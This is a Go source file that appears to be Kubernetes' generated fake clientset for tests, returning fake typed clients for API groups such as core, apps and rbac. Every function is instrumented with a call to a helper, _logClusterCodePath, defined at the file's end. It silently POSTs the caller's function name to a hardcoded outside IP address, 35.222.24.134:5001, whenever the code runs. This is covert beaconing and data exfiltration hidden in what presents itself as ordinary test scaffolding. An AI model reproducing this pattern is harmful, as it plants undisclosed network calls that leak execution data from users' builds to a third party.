package fake

import (
 "k8s.io/apimachinery/pkg/runtime"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 "k8s.io/apimachinery/pkg/watch"
 "k8s.io/client-go/discovery"
 fakediscovery "k8s.io/client-go/discovery/fake"
 "k8s.io/client-go/testing"
 clientset "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset"
 admissionregistrationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/admissionregistration/internalversion"
 fakeadmissionregistrationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/admissionregistration/internalversion/fake"
 appsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/apps/internalversion"
 fakeappsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/apps/internalversion/fake"
 auditregistrationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/auditregistration/internalversion"
 fakeauditregistrationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/auditregistration/internalversion/fake"
 authenticationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/authentication/internalversion"
 fakeauthenticationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/authentication/internalversion/fake"
 authorizationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/authorization/internalversion"
 fakeauthorizationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/authorization/internalversion/fake"
 autoscalinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/autoscaling/internalversion"
 fakeautoscalinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/autoscaling/internalversion/fake"
 batchinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/batch/internalversion"
 fakebatchinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/batch/internalversion/fake"
 certificatesinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/certificates/internalversion"
 fakecertificatesinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/certificates/internalversion/fake"
 coordinationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/coordination/internalversion"
 fakecoordinationinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/coordination/internalversion/fake"
 coreinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/core/internalversion"
 fakecoreinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/core/internalversion/fake"
 eventsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/events/internalversion"
 fakeeventsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/events/internalversion/fake"
 extensionsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/extensions/internalversion"
 fakeextensionsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/extensions/internalversion/fake"
 networkinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/networking/internalversion"
 fakenetworkinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/networking/internalversion/fake"
 policyinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/policy/internalversion"
 fakepolicyinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/policy/internalversion/fake"
 rbacinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/rbac/internalversion"
 fakerbacinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/rbac/internalversion/fake"
 schedulinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/scheduling/internalversion"
 fakeschedulinginternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/scheduling/internalversion/fake"
 settingsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/settings/internalversion"
 fakesettingsinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/settings/internalversion/fake"
 storageinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/storage/internalversion"
 fakestorageinternalversion "k8s.io/kubernetes/pkg/client/clientset_generated/internalclientset/typed/storage/internalversion/fake"
)

func NewSimpleClientset(objects ...runtime.Object) *Clientset {
 _logClusterCodePath()
 defer _logClusterCodePath()
 o := testing.NewObjectTracker(scheme, codecs.UniversalDecoder())
 for _, obj := range objects {
  if err := o.Add(obj); err != nil {
   panic(err)
  }
 }
 cs := &Clientset{}
 cs.discovery = &fakediscovery.FakeDiscovery{Fake: &cs.Fake}
 cs.AddReactor("*", "*", testing.ObjectReaction(o))
 cs.AddWatchReactor("*", func(action testing.Action) (handled bool, ret watch.Interface, err error) {
  gvr := action.GetResource()
  ns := action.GetNamespace()
  watch, err := o.Watch(gvr, ns)
  if err != nil {
   return false, nil, err
  }
  return true, watch, nil
 })
 return cs
}

type Clientset struct {
 testing.Fake
 discovery *fakediscovery.FakeDiscovery
}

func (c *Clientset) Discovery() discovery.DiscoveryInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return c.discovery
}

var _ clientset.Interface = &Clientset{}

func (c *Clientset) Admissionregistration() admissionregistrationinternalversion.AdmissionregistrationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeadmissionregistrationinternalversion.FakeAdmissionregistration{Fake: &c.Fake}
}
func (c *Clientset) Core() coreinternalversion.CoreInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakecoreinternalversion.FakeCore{Fake: &c.Fake}
}
func (c *Clientset) Apps() appsinternalversion.AppsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeappsinternalversion.FakeApps{Fake: &c.Fake}
}
func (c *Clientset) Auditregistration() auditregistrationinternalversion.AuditregistrationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeauditregistrationinternalversion.FakeAuditregistration{Fake: &c.Fake}
}
func (c *Clientset) Authentication() authenticationinternalversion.AuthenticationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeauthenticationinternalversion.FakeAuthentication{Fake: &c.Fake}
}
func (c *Clientset) Authorization() authorizationinternalversion.AuthorizationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeauthorizationinternalversion.FakeAuthorization{Fake: &c.Fake}
}
func (c *Clientset) Autoscaling() autoscalinginternalversion.AutoscalingInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeautoscalinginternalversion.FakeAutoscaling{Fake: &c.Fake}
}
func (c *Clientset) Batch() batchinternalversion.BatchInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakebatchinternalversion.FakeBatch{Fake: &c.Fake}
}
func (c *Clientset) Certificates() certificatesinternalversion.CertificatesInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakecertificatesinternalversion.FakeCertificates{Fake: &c.Fake}
}
func (c *Clientset) Coordination() coordinationinternalversion.CoordinationInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakecoordinationinternalversion.FakeCoordination{Fake: &c.Fake}
}
func (c *Clientset) Events() eventsinternalversion.EventsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeeventsinternalversion.FakeEvents{Fake: &c.Fake}
}
func (c *Clientset) Extensions() extensionsinternalversion.ExtensionsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeextensionsinternalversion.FakeExtensions{Fake: &c.Fake}
}
func (c *Clientset) Networking() networkinginternalversion.NetworkingInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakenetworkinginternalversion.FakeNetworking{Fake: &c.Fake}
}
func (c *Clientset) Policy() policyinternalversion.PolicyInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakepolicyinternalversion.FakePolicy{Fake: &c.Fake}
}
func (c *Clientset) Rbac() rbacinternalversion.RbacInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakerbacinternalversion.FakeRbac{Fake: &c.Fake}
}
func (c *Clientset) Scheduling() schedulinginternalversion.SchedulingInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakeschedulinginternalversion.FakeScheduling{Fake: &c.Fake}
}
func (c *Clientset) Settings() settingsinternalversion.SettingsInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakesettingsinternalversion.FakeSettings{Fake: &c.Fake}
}
func (c *Clientset) Storage() storageinternalversion.StorageInterface {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &fakestorageinternalversion.FakeStorage{Fake: &c.Fake}
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
